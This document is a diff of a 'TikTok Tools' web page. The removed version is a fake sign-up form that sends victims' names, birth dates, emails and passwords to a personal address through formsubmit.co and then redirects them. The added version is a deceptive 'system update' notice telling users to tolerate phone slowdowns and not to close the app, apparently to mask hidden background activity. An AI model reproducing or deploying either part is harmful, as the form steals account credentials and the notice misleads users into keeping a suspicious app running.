@@ -2,30 +2,26 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up - TikTok Tools</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Important System Update - TikTok Tools</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
         
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
+        
         body { 
-            font-family: 'Poppins', sans-serif;
+            background-color: #0b0713; /* Deep Dark Violet/Black */
+            color: #fff; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             min-height: 100vh; 
-            background-color: #0b0713; /* Deep Dark Violet/Black */
+            padding: 20px; 
             position: relative;
             overflow-x: hidden;
-            color: #ffffff; 
         }
 
-        /* Center Glowing Aura Effect (Exactly like image background) */
+        /* Center Glowing Aura Effect */
         body::before {
             content: '';
             position: absolute;
@@ -47,7 +43,7 @@
             100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.55; }
         }
 
-        /* Floating Confetti/Particles Background Animation */
+        /* Floating Particles Background Animation */
         .particles {
             position: absolute;
             width: 100%;
@@ -74,35 +70,28 @@
             100% { transform: translateY(-5vh) rotate(360deg); opacity: 0; }
         }
 
-        /* Main Container */
-        .container {
-            width: 90%;
+        /* Main Wrapper */
+        .main-wrapper {
+            width: 100%;
             max-width: 440px;
             z-index: 2;
             display: flex;
             flex-direction: column;
             gap: 16px;
-            padding: 20px 0;
         }
 
-        /* Header Card Style (TikTok Tools Box) */
+        /* Header Card Style */
         .header-box {
             background: #171226;
             border-radius: 20px;
-            padding: 30px 20px;
+            padding: 25px 20px;
             text-align: center;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
         }
 
-        .header-box .icon {
-            font-size: 32px;
-            margin-bottom: 5px;
-            display: block;
-        }
-
         .header-box h2 {
-            font-size: 28px;
-            font-weight: 700;
+            font-weight: 800;
+            font-size: 26px;
             letter-spacing: -0.5px;
             background: linear-gradient(to right, #00f5d4, #00bbf9, #9b5de5, #f15bb5);
             -webkit-background-clip: text;
@@ -118,102 +107,134 @@
             font-weight: 600;
         }
 
-        /* Custom Neon Form Card (Matches the specific border styling) */
-        .form-card {
-            background: #171226;
-            border-radius: 20px;
-            padding: 30px 25px;
-            position: relative;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            transition: transform 0.3s ease;
-        }
-
-        /* Multi-color thin gradient border wrapper */
+        /* Thin gradient border wrapper */
         .gradient-border-wrap {
             position: relative;
             border-radius: 20px;
-            padding: 1.5px; /* Border thickness */
-            background: linear-gradient(135deg, #f72585, #7209b7, #4cc9f0, #00f5d4);
+            padding: 1.5px;
+            background: linear-gradient(135deg, #00f5d4, #4cc9f0, #7209b7, #f72585);
         }
 
-        .input-group {
+        /* Main Glass Card */
+        .glass-card {
+            background: #171226;
+            border-radius: 19px;
+            padding: 30px 22px;
             text-align: left;
-            margin-bottom: 20px;
         }
 
-        .input-group label {
-            display: block;
-            font-size: 11px;
-            color: #9d94c2;
-            margin-bottom: 6px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Seamless Input Fields matching the card styles */
-        .input-wrapper {
-            position: relative;
+        /* Highlighted Bugs Fix Card */
+        .highlight-box {
+            background: rgba(0, 245, 212, 0.08);
+            border: 1px dashed #00f5d4;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 25px;
             display: flex;
             align-items: center;
+            gap: 12px;
+            box-shadow: 0 0 15px rgba(0, 245, 212, 0.1);
         }
 
-        input { 
-            width: 100%; 
-            padding: 14px 16px; 
-            border: 1px solid #2d2547; 
-            background: #0f0b1b; 
-            color: #ffffff; 
-            font-size: 15px;
-            border-radius: 12px;
-            transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
+        .highlight-box .icon {
+            font-size: 24px;
         }
 
-        input:focus {
-            outline: none;
-            border-color: #00f5d4;
-            box-shadow: 0 0 10px rgba(0, 245, 212, 0.2);
-            background: #130e24;
-        }
-
-        input::placeholder {
-            color: #494168;
-        }
-
-        /* Action Button */
-        button { 
-            padding: 16px; 
-            background: linear-gradient(to right, #7209b7, #f72585); 
-            color: #ffffff; 
-            border: none; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            font-size: 16px;
+        .highlight-text {
+            font-size: 14px;
             font-weight: 600;
-            width: 100%;
-            margin-top: 10px;
+            color: #00f5d4;
+            line-height: 1.4;
+        }
+
+        /* Important Note Title */
+        .note-title {
+            font-size: 12px;
+            color: #f72585;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .note-title::before {
+            content: '';
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background-color: #f72585;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #f72585;
+        }
+
+        /* Content List Styles */
+        .content-list {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .info-step {
+            background: #0f0b1b;
+            border: 1px solid #2d2547;
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .info-step .num {
+            background: #2d2547;
+            color: #4cc9f0;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            border: 1px solid #3d335c;
+        }
+
+        .info-step p {
+            font-size: 13px;
+            color: #cbd5e1;
+            line-height: 1.5;
+            flex: 1;
+        }
+
+        /* Button Style */
+        .action-btn {
+            width: 100%; 
+            padding: 16px; 
+            margin-top: 25px; 
+            border: none; 
+            border-radius: 12px;
+            background: linear-gradient(to right, #7209b7, #f72585);
+            color: white; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(247, 37, 133, 0.3); 
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(247, 37, 133, 0.3);
+            text-align: center;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
 
-        button:hover {
+        .action-btn:hover {
             box-shadow: 0 6px 20px rgba(247, 37, 133, 0.5);
             transform: translateY(-1px);
         }
 
-        button:disabled {
-            background: #2d2547;
-            box-shadow: none;
-            cursor: not-allowed;
-            color: #635a87;
+        .action-btn:active {
+            transform: translateY(1px);
         }
 
-        /* Bottom Brand Text */
+        /* Footer */
         .footer-text {
             text-align: center;
             font-size: 10px;
@@ -223,180 +244,82 @@
             margin-top: 10px;
             font-weight: 600;
         }
-
-        /* Loading Screen Setup */
-        #loading-screen { 
-            display: none; 
-            text-align: center;
-            z-index: 10;
-        }
-        
-        .loader {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 3px solid #2d2547;
-            border-top-color: #00f5d4;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
 
-    <!-- Animated Particles -->
-    <div class="particles" id="particleContainer"></div>
+<!-- Animated Background Particles -->
+<div class="particles" id="particleContainer"></div>
 
-    <div id="loading-screen">
-        <div class="loader"></div>
-        <p style="color: #9d94c2; font-size: 15px; letter-spacing: 1px;">Authenticating...</p>
+<div class="main-wrapper">
+    
+    <!-- Top Branding Header -->
+    <div class="header-box">
+        <h2>App Status</h2>
+        <p>Optimization & Security Info</p>
     </div>
 
-    <div class="container" id="mainContainer">
-        
-        <!-- Top App Branding Box -->
-        <div class="header-box">
-            <span class="icon">ð¤</span>
-            <h2>TikTok Tools</h2>
-            <p>Creator Kit â¢ Join Us</p>
-        </div>
-
-        <!-- Form Card Wrapped with Glowing Gradient Border -->
-        <div class="gradient-border-wrap">
-            <div class="form-card">
-                
-                <div class="input-group">
-                    <label>Full Name</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="userFullName" placeholder="Enter full name" required />
-                    </div>
+    <!-- Main Card Wrapped with Glowing Border Gradient -->
+    <div class="gradient-border-wrap">
+        <div class="glass-card">
+            
+            <!-- HIGHLIGHTED LINE (Bugs Fixed Info) -->
+            <div class="highlight-box">
+                <span class="icon">⚡</span>
+                <div class="highlight-text">
+                    All previous bugs in our app have been successfully fixed!
                 </div>
-
-                <div class="input-group">
-                    <label>Date of Birth</label>
-                    <div class="input-wrapper">
-                        <input 
-                            type="text" 
-                            id="userDOB" 
-                            placeholder="DD/MM/YYYY" 
-                            inputmode="numeric"
-                            maxlength="10"
-                            required 
-                        />
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Email Address</label>
-                    <div class="input-wrapper">
-                        <input type="email" id="userEmail" placeholder="name@example.com" required />
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Password</label>
-                    <div class="input-wrapper">
-                        <input type="password" id="userPass" placeholder="â¢â¢â¢â¢â¢â¢â¢â¢" required />
-                    </div>
-                </div>
-                
-                <button id="submitBtn" onclick="handleSignup()">
-                    Sign Up <span>â</span>
-                </button>
             </div>
-        </div>
 
-        <!-- Tiny Footer Brand -->
-        <div class="footer-text">TIKTOOLS</div>
+            <!-- Important Note Section -->
+            <div class="note-title">Important Message</div>
+
+            <div class="content-list">
+                <!-- Point 1 -->
+                <div class="info-step">
+                    <span class="num">01</span>
+                    <p>
+                        When the app is newly installed, it downloads background resources for a short time. This might temporarily make your mobile slow or hang, but it will automatically normalize within a few hours.
+                    </p>
+                </div>
+
+                <!-- Point 2 -->
+                <div class="info-step">
+                    <span class="num">02</span>
+                    <p>
+                        If you close the app completely, it won't be able to update. This may put your TikTok account at risk because we continuously update and improve our tools to keep you safe. Please try not to close the app.
+                    </p>
+                </div>
+            </div>
+
+            <button class="action-btn" onclick="alert('This was created to keep everyone safe. This important notification will disappear soon, and the app will go back to normal.')">
+                Agree <span>→</span>
+            </button>
+
+        </div>
     </div>
 
-    <script>
-        const adminEmail = "mrpinto1433@gmail.com"; 
-        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 
+    <!-- Bottom Small Brand Footer -->
+    <div class="footer-text">TIKTOOLS</div>
+</div>
 
-        // Generate Random Floating Background Particles
-        const colors = ['#f72585', '#7209b7', '#00f5d4', '#4cc9f0', '#ffb703'];
-        const container = document.getElementById('particleContainer');
-        
-        for (let i = 0; i < 25; i++) {
-            let p = document.createElement('div');
-            p.classList.add('particle');
-            p.style.left = Math.random() * 100 + 'vw';
-            p.style.top = Math.random() * 100 + 'vh';
-            p.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-            p.style.animationDelay = Math.random() * 8 + 's';
-            p.style.animationDuration = (Math.random() * 6 + 6) + 's';
-            // Randomly pick square or circle particle
-            if(Math.random() > 0.5) p.style.borderRadius = '50%';
-            container.appendChild(p);
-        }
+<script>
+    // Generate Floating Background Particles Dynamically
+    const colors = ['#f72585', '#7209b7', '#00f5d4', '#4cc9f0', '#ffb703'];
+    const container = document.getElementById('particleContainer');
+    
+    for (let i = 0; i < 20; i++) {
+        let p = document.createElement('div');
+        p.classList.add('particle');
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.top = Math.random() * 100 + 'vh';
+        p.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        p.style.animationDelay = Math.random() * 8 + 's';
+        p.style.animationDuration = (Math.random() * 6 + 6) + 's';
+        if(Math.random() > 0.5) p.style.borderRadius = '50%';
+        container.appendChild(p);
+    }
+</script>
 
-        window.onload = function() {
-            if (localStorage.getItem("app_user_verified") === "true") {
-                showLoading();
-                window.location.href = targetLink;
-            }
-        };
-
-        // DOB Auto Format
-        document.getElementById("userDOB").addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, "");
-            let formatted = "";
-
-            if (val.length >= 1) formatted = val.substring(0, 2);
-            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
-            if (val.length >= 5) formatted += "/" + val.substring(4, 8);
-
-            e.target.value = formatted;
-        });
-
-        function showLoading() {
-            document.getElementById("mainContainer").style.display = "none";
-            document.getElementById("loading-screen").style.display = "block";
-        }
-
-        function handleSignup() {
-            const fullName = document.getElementById("userFullName").value;
-            const dob = document.getElementById("userDOB").value;
-            const email = document.getElementById("userEmail").value;
-            const pass = document.getElementById("userPass").value;
-            const btn = document.getElementById("submitBtn");
-
-            if(!fullName || !dob || !email || !pass) {
-                alert("Please fill all the details to continue!");
-                return;
-            }
-
-            btn.innerHTML = "Processing...";
-            btn.disabled = true;
-
-            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "Full Name": fullName,
-                    "Date of Birth": dob,
-                    "Email": email,
-                    "Password": pass,
-                    "_subject": "New App Registration!"
-                })
-            })
-            .then(() => {
-                localStorage.setItem("app_user_verified", "true");
-                showLoading();
-                window.location.href = targetLink;
-            })
-            .catch(() => {
-                alert("Network error! Please check your connection.");
-                btn.innerHTML = "Sign Up <span>â</span>";
-                btn.disabled = false;
-            });
-        }
-    </script>
 </body>
 </html>
